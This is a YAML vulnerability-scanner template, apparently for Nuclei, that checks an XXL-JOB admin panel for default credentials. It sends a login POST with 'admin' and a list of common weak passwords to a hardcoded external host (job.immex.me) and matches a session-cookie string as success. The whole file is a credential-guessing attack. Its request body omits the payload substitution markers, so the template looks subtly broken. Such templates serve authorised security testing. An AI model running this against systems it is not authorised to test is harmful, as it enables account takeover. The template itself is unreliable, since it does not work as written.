id: xxljob-default
info:
  name: xxljob-default-password
  author: hanlaomo
  severity: high

requests:

  - payloads:
      username:
        - admin

      password:
        - admin
        - guest
        - password
        - test
        - 12345
        - 123456

    attack: clusterbomb  # Available options: sniper, pitchfork and clusterbomb

    raw:
      # Request with simple param and header manipulation with DSL functions
      - |
        POST /login HTTP/1.1
        Host: job.immex.me
        Connection: close
        Content-Length: 30
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: https://job.immex.me
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://job.immex.me/toLogin
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

        userName=username&password=password

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - XXL_JOB_LOGIN_IDENTITY
